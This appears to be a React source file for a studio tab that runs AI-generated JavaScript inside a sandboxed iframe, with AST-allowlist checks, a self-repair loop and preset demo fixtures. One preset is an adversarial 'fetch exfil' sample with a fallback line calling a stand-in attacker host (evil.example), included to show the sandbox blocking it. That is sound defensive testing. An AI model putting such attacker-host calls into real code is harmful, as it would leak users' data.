"use client";

/**
 * code-sandbox-island.tsx — /studio "Code-Island" tab (Phase 20).
 *
 * TWO modes, both feeding the jailed CodeIslandFrame:
 *  1. LIVE: type an intent → tRPC genui.codeIslandGenerate → Bedrock emits arbitrary JS island
 *     code → rendered in the sandboxed frame with the repair loop. The live healer re-generates
 *     with the runtime error appended (bounded by the frame's ≤2 attempt budget).
 *  2. PRESETS: hand-authored fixtures proving each path (curveball / self-heal / fallback / blocked).
 *
 * Security: the HOST does no eval/Function/dangerouslySetInnerHTML — execution is jailed to the
 * iframe; the AST allowlist rejects dangerous code before execution. D-06: generation is
 * manually triggered (enabled:false + refetch), never automatic.
 */

import React, { useCallback, useMemo, useState } from "react";
import dynamic from "next/dynamic";
import { Loader2, Play, Sparkles } from "lucide-react";

import { Button } from "@polytoken/ui/button";
import { Textarea } from "@polytoken/ui/textarea";

import {
  ADVERSARIAL_FIXTURES,
  BROKEN_ISLAND_CODE,
  CURVEBALL_SOUNDSCAPE_CODE,
  UNREPAIRABLE_ISLAND_CODE,
  failingHealer,
  stubHealer,
  type IslandHealer,
} from "@polytoken/genui/sandbox";

import { FileTree, type FileTreeNode } from "~/components/file-tree";
import { api } from "~/trpc/react";

const CodeIslandFrame = dynamic(
  () => import("./code-island-frame").then((m) => ({ default: m.CodeIslandFrame })),
  {
    ssr: false,
    loading: () => <div className="text-sm text-faded">Loading sandboxed runtime…</div>,
  },
);

interface Preset {
  readonly id: string;
  readonly label: string;
  readonly code: string;
  readonly heal?: IslandHealer;
}

const FETCH_EXFIL =
  ADVERSARIAL_FIXTURES.find((f) => f.name === "fetch-exfil")?.code ??
  "fetch('https://evil.example');";

const PRESETS: readonly Preset[] = [
  { id: "curveball", label: "Curveball — soundscape mixer (canvas)", code: CURVEBALL_SOUNDSCAPE_CODE },
  { id: "broken", label: "Broken → self-heals", code: BROKEN_ISLAND_CODE, heal: stubHealer },
  { id: "unrepairable", label: "Unrepairable → safe fallback", code: UNREPAIRABLE_ISLAND_CODE, heal: failingHealer },
  { id: "adversarial", label: "Adversarial (fetch exfil) → blocked", code: FETCH_EXFIL },
];

/**
 * ADOPT-02 Plan A (27-UI-SPEC.md § "ADOPT-02 — FileTree"): the 4 PRESETS as
 * folders, each holding one `island.js` leaf. Selecting a leaf resolves its
 * parent preset id (`${presetId}/island.js` -> split on "/") and calls the
 * SAME handlePreset the old <Select> wired.
 */
const FILE_TREE_DATA: readonly FileTreeNode[] = PRESETS.map((p) => ({
  id: p.id,
  name: p.label,
  type: "folder",
  children: [{ id: `${p.id}/island.js`, name: "island.js", type: "file" }],
}));

export function CodeSandboxIsland(): React.ReactElement {
  const [intent, setIntent] = useState<string>("");
  const [presetId, setPresetId] = useState<string>(PRESETS[0]!.id);
  const [code, setCode] = useState<string>(PRESETS[0]!.code);
  const [runId, setRunId] = useState<number>(0);
  const [active, setActive] = useState<{ code: string; heal?: IslandHealer } | null>(null);
  const [genError, setGenError] = useState<string | null>(null);

  const utils = api.useUtils();
  const gen = api.genui.codeIslandGenerate.useQuery(
    { intent, rawContent: "" },
    { enabled: false, retry: false, refetchOnWindowFocus: false },
  );

  // Live healer: regenerate with the runtime error appended. Bounded by the frame's attempt budget.
  const liveHealer: IslandHealer = useCallback(
    async (failedCode, error) => {
      try {
        const res = await utils.genui.codeIslandGenerate.fetch({
          intent: `${intent}\n\nThe previous attempt threw a runtime error: ${error}\nReturn corrected, self-contained code.`,
          rawContent: "",
        });
        return res.outcome === "fallback" || res.code.length === 0 ? null : res.code;
      } catch {
        return null;
      }
    },
    [utils, intent],
  );

  const currentPreset = useMemo(
    () => PRESETS.find((p) => p.id === presetId) ?? PRESETS[0]!,
    [presetId],
  );

  const handleGenerate = useCallback(async (): Promise<void> => {
    if (intent.trim().length === 0) return;
    setGenError(null);
    const res = await gen.refetch();
    if (!res.data || res.data.code.length === 0) {
      setActive(null);
      setGenError("Generation failed — no response from the service. Is the backend running?");
      return;
    }
    // Honest fallback: the model did NOT return a usable widget. Do not run the placeholder
    // code and mark it "Rendered ✓" — surface the failure clearly instead.
    if (res.data.outcome === "fallback") {
      setActive(null);
      setCode(res.data.code);
      setGenError(
        res.data.reason ??
          "Generation fell back — the model did not return a usable widget (often a token-limit truncation or a hard prompt). Try again or simplify, and check the backend logs.",
      );
      return;
    }
    setCode(res.data.code);
    setActive({ code: res.data.code, heal: liveHealer });
    setRunId((n) => n + 1);
  }, [intent, gen, liveHealer]);

  const handlePreset = useCallback((value: string): void => {
    const preset = PRESETS.find((p) => p.id === value) ?? PRESETS[0]!;
    setPresetId(preset.id);
    setCode(preset.code);
  }, []);

  // FileTree onSelect fires with the island.js leaf node; resolve its parent
  // preset id from the "{presetId}/island.js" leaf id and reuse handlePreset —
  // selecting a file never auto-runs (D-06); "Run preset" stays manual.
  const handleFileTreeSelect = useCallback(
    (node: FileTreeNode): void => {
      const parentPresetId = node.id.split("/")[0] ?? node.id;
      handlePreset(parentPresetId);
    },
    [handlePreset],
  );

  const handleRunPreset = useCallback((): void => {
    setGenError(null);
    setActive({ code, heal: currentPreset.heal });
    setRunId((n) => n + 1);
  }, [code, currentPreset]);

  return (
    <div className="flex flex-col gap-4 p-4">
      <div className="rounded-md border border-hair bg-leaf px-3 py-2 text-xs text-faded">
        <strong className="text-ink">Jailed-eval code-island.</strong> Generated code runs in a
        sandboxed opaque-origin iframe (no host DOM/cookies/storage; network blocked by CSP). An AST
        allowlist rejects dangerous APIs before execution; a v0-style repair loop self-heals runtime
        errors (≤2 attempts) then falls back to a safe placeholder.
      </div>

      {/* LIVE generation from intent */}
      <div className="flex flex-col gap-2 rounded-card border border-rule bg-bright p-3">
        <span className="text-sm font-semibold text-ink">Generate from intent</span>
        <Textarea
          value={intent}
          onChange={(e) => setIntent(e.target.value)}
          placeholder="e.g. a web soundscape mixer that feels like a physical desktop console"
          aria-label="Generation intent"
          className="h-20"
        />
        <div className="flex items-center gap-3">
          <Button onClick={handleGenerate} disabled={gen.isFetching || intent.trim().length === 0} className="gap-1">
            {gen.isFetching ? <Loader2 className="size-4 animate-spin" aria-hidden /> : <Sparkles className="size-4" aria-hidden />}
            Generate &amp; run
          </Button>
          {/* An error is a STATE — ink, never madder (law 1). */}
          {genError ? (
            <span role="alert" className="text-xs font-semibold text-ink">
              {genError}
            </span>
          ) : null}
        </div>
      </div>

      {/* PRESET fixtures — browsed via FileTree (ADOPT-02): 4 preset folders,
          each holding one island.js leaf. Selecting a leaf calls the SAME
          handlePreset the old <Select> wired; it never auto-runs — "Run
          preset" stays the separate manual trigger (D-06). */}
      <div className="flex flex-col gap-2 rounded-card border border-rule bg-bright p-3">
        <span className="text-sm font-semibold text-ink">Or try a preset</span>
        <FileTree
          data={FILE_TREE_DATA}
          selectedId={`${presetId}/island.js`}
          onSelect={handleFileTreeSelect}
          defaultExpandedIds={[presetId]}
        />
        <Button variant="outline" onClick={handleRunPreset} className="w-fit gap-1">
          <Play className="size-4" aria-hidden />
          Run preset
        </Button>
      </div>

      <label className="flex flex-col gap-1 text-sm">
        <span className="text-faded">Island code (editable — plain JS, runs against a fresh document)</span>
        <Textarea
          value={code}
          onChange={(e) => setCode(e.target.value)}
          spellCheck={false}
          aria-label="Island code"
          className="h-48 font-mono text-xs"
        />
      </label>

      {active ? (
        <CodeIslandFrame key={runId} code={active.code} heal={active.heal} />
      ) : (
        /* Empty state — teaches the two entry points (SURF-06) */
        <div className="rounded-card border border-rule bg-leaf p-panel text-center">
          <p className="text-sm font-semibold text-ink">Nothing running yet.</p>
          <p className="mt-1 text-sm text-faded">
            Generate from an intent above, or pick a preset and press Run —
            the jailed frame renders here.
          </p>
        </div>
      )}
    </div>
  );
}
